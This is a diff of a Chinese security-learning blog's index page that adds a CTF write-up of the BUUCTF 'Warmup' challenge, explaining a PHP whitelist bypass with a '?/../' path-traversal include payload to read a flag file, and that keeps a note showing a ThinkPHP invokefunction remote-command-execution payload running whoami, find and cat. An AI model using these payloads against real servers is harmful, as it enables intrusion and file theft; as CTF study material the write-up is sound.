@@ -147,6 +147,140 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/01/31/buu-Warmup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="六公子买单">
+      <meta itemprop="description" content="一头努力的菜鸟">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Daq1ang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/31/buu-Warmup/" class="post-title-link" itemprop="url">buu-Warmup</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-01-31 17:28:53" itemprop="dateCreated datePublished" datetime="2021-01-31T17:28:53+08:00">2021-01-31</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-03-17 14:15:25" itemprop="dateModified" datetime="2021-03-17T14:15:25+08:00">2021-03-17</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="根据题目得到代码如下，开始代码审计"><a href="#根据题目得到代码如下，开始代码审计" class="headerlink" title="根据题目得到代码如下，开始代码审计"></a>根据题目得到代码如下，开始代码审计</h2><pre><code>&lt;?php
+    highlight_file(__FILE__);
+class emmm
+&#123;
+    public static function checkFile(&amp;$page)
+    &#123;
+        $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];
+        //得到另外一个文件hint.php，包含得到flag的文件名
+
+        //isset()判断变量是否声明，is_string()判断变量是否是字符串
+        if (! isset($page) || !is_string($page)) &#123;
+            echo &quot;you can&#39;t see it&quot;;
+            return false;
+        &#125;
+
+        //检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真
+        if (in_array($page, $whitelist)) &#123;            
+            return true;
+        &#125;
+
+        //过滤问号的函数(如果$page的值有？则从?之前提取字符串)
+        $_page = mb_substr(
+            $page,
+            0,
+            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
+        );
+
+        //第二次检测传进来的值是否匹配白名单列表$whitelist
+        if (in_array($_page, $whitelist)) &#123;
+            return true;
+        &#125;
+
+        //对$page进行url解码
+        $_page = urldecode($page);
+
+         //第二次过滤问号的函数(如果$page的值有？则从?之前提取字符串)
+        $_page = mb_substr(
+            $_page,
+            0,
+            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
+        );
+
+        //第三次检测传进来的值是否匹配白名单列表$whitelist
+        if (in_array($_page, $whitelist)) &#123;
+            return true;
+        &#125;
+
+        //若以上都没通过，则返回false
+        echo &quot;you can&#39;t see it&quot;;
+        return false;
+    &#125;
+&#125;
+
+//---------------------------------------------------------------
+//这里就到了文件包含，需要传入的参数file不为空且是字符串，经过class emmm的检测，即emmm返回真，则包含file    
+if (! empty($_REQUEST[&#39;file&#39;])
+    &amp;&amp; is_string($_REQUEST[&#39;file&#39;])
+    &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])
+) &#123;
+    include $_REQUEST[&#39;file&#39;];
+    exit;
+&#125; else &#123;
+    echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
+&#125;  
+?&gt;</code></pre>
+<hr>
+<p>观察源码发现hint.php，打开发现<br>flag not here, and flag in ffffllllaaaagggg<br>如果满足相应的条件，include引入文件。只需使emmm::checkFile($_REQUEST[‘file’]返回值为true，利用../跳转目录读取flag即可。<br>payload为：file=source.php?/../ffffllllaaaagggg，经过mb_strpos为source.php?/../ffffllllaaaagggg?,  但是mb_strpos这个函数只返回首次出现的位置，所以还是会返回第一个？的位置，而mb_substr截取函数，从0开始截取一直到第一个？的位置，截取内容为source.php，恰好能与白名单中的进行匹配，可以return true;，所以通过第一次截取进行绕过<br>ffffllllaaaagggg文件和index.php不在同一个目录下，所以读取的是上级目录。构造payload <a target="_blank" rel="noopener" href="http://web5.buuctf.cn/?file=source.php?../../../../../ffffllllaaaagggg%EF%BC%8C%E6%89%BE%E5%88%B0flag%EF%BC%88%E5%88%A9%E7%94%A8/%E4%BD%BFsource.php?%E6%88%90%E4%B8%BA%E4%B8%80%E4%B8%AA%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E7%9B%AE%E5%BD%95%EF%BC%8C%E6%9C%80%E5%90%8Einclude%E5%88%A9%E7%94%A8../%E8%B7%B3%E8%BD%AC%E7%9B%AE%E5%BD%95%E8%AF%BB%E5%8F%96flag%E5%8D%B3%E5%8F%AF%EF%BC%89">http://web5.buuctf.cn/?file=source.php?../../../../../ffffllllaaaagggg，找到flag（利用/使source.php?成为一个不存在的目录，最后include利用../跳转目录读取flag即可）</a>  </p>
+<ul>
+<li>注意：../ 有多少个不一定，因为不知道flag在第几层目录里，需要从没有开始一次加一个去尝试。</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -337,127 +471,6 @@
 <h2 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h2><p>php_rce,已经可以看出是 php 远程命令执行的缩写<br>直接看漏洞利用：<br><a target="_blank" rel="noopener" href="http://localhost:9096/public/index.php?s=index/think%5Capp/invokefunction&amp;function=call_user_func_array&amp;va">http://localhost:9096/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;va</a><br>rs[0]=system&amp;vars[1][]=whoami<br>直接找flag<br>/index.php?s=index/think\app/invokefunction&amp;func<br>tion=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find%20/%20-name%20%<br>22flag%22<br>查flag<br>/index.php?s=index/think\app/invokefunction&amp;func<br>tion=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag</p>
 <hr>
 <h2 id="easytornado"><a href="#easytornado" class="headerlink" title="easytornado"></a>easytornado</h2>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/01/12/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="六公子买单">
-      <meta itemprop="description" content="一头努力的菜鸟">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Daq1ang">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/01/12/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">PHP学习笔记</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2021-01-12 14:48:37" itemprop="dateCreated datePublished" datetime="2021-01-12T14:48:37+08:00">2021-01-12</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-01-31 18:16:40" itemprop="dateModified" datetime="2021-01-31T18:16:40+08:00">2021-01-31</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web-security/" itemprop="url" rel="index"><span itemprop="name">web security</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web-security/%E5%81%9A%E4%B8%80%E9%A1%B6%E7%99%BD%E5%B8%BD%E5%AD%90/" itemprop="url" rel="index"><span itemprop="name">做一顶白帽子</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="下午搞一搞PHP"><a href="#下午搞一搞PHP" class="headerlink" title="下午搞一搞PHP"></a>下午搞一搞PHP</h2><hr>
-<h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><ul>
-<li><p>var_dump() 会返回变量的数据类型和值：</p>
-</li>
-<li><p>在 PHP 中，所有用户定义的函数、类和关键词（例如 if、else、echo 等等）都对大小写不敏感。<u>所有变量都对大小写敏感</u>  </p>
-</li>
-<li><p>var_dump() 会返回变量的数据类型和值    </p>
-<h3 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h3></li>
-<li><p>str_word_count() 函数对字符串中的单词进行计数  </p>
-</li>
-<li><p>strrev() 函数反转字符串</p>
-</li>
-<li><p>strpos() 函数用于检索字符串内指定的字符或文本<br>如果找到匹配，则会返回首个匹配的<u>字符位置</u>。如果未找到匹配，则将返回 FALSE。下例检索字符串 “Hello world!” 中的文本 “world”：<br><img src="images/php1.0.png" alt="php1.0"></p>
-</li>
-<li><p>str_replace() 函数用一些字符串替换字符串中的另一些字符<br><img src="images/php1.2.png" alt="php1.2">   </p>
-<blockquote>
-<p>+strstr()、strchr()、strrchr()和stristr()：在字符串中查找字符串函数      </p>
-<blockquote>
-<p>函数strstr()有两个变体。第一个变体是stristr()，它几乎和strstr()一样，其区别在于不区分字符大小写<br>第二个变体是strrchr()， 函数查找==字符==（注意：这里是字符不是字符串）在指定字符串中从后面开始的第一次出现的位置，如果成功，则返回从该位置到字符串结尾的所有字符，如果失败，则返回 false。<br><img src="images/php1.3.png" alt="php1.3">   </p>
-</blockquote>
-</blockquote>
-</li>
-<li><p>substr()截取字符串前N个字符或者从第几个字符开始取几个字符  </p>
-</li>
-</ul>
-<hr>
-<pre><code>&lt;?php    
-$str = &quot;123456789&quot;;   
-echo substr($str , 0 , 3);//从左边第一位字符起截取3位字符：结果：123
-echo substr($str , 3 , 3);//从左边第3位字符起截取3位字符：结果：456
-?&gt;   </code></pre>
-<hr>
-<pre><code>&lt;?php
-$rest = substr(&quot;abcdef&quot;, -1);    // 返回 &quot;f&quot;
-$rest = substr(&quot;abcdef&quot;, -2);    // 返回 &quot;ef&quot;
-$rest = substr(&quot;abcdef&quot;, -3, 1); // 返回 &quot;d&quot;
-?&gt;        </code></pre>
-<h2 id="2021-1-31"><a href="#2021-1-31" class="headerlink" title="2021.1.31"></a>2021.1.31</h2><h3 id="buu-warmup"><a href="#buu-warmup" class="headerlink" title="buu - warmup"></a>buu - warmup</h3><ul>
-<li>isset()： 判断变量是否声明；       </li>
-<li>is_string()： 判断变量是否是字符串；     </li>
-<li>in_array(search,array)： 判断array中是否存在search；     </li>
-<li>mb_substr()： 函数返回字符串的一部分    </li>
-<li>mb_strpos（haystack，needle）： 在 haystack 中查找needle第一次出现的位置 ；</li>
-</ul>
-
       
     </div>
 
@@ -942,11 +955,11 @@ $rest = substr(&quot;abcdef&quot;, -3, 1); // 返回 &quot;d&quot;
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-count">9</span>
         <span class="site-state-item-name">categories</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-count">14</span>
         <span class="site-state-item-name">tags</span>
       </div>
   </nav>
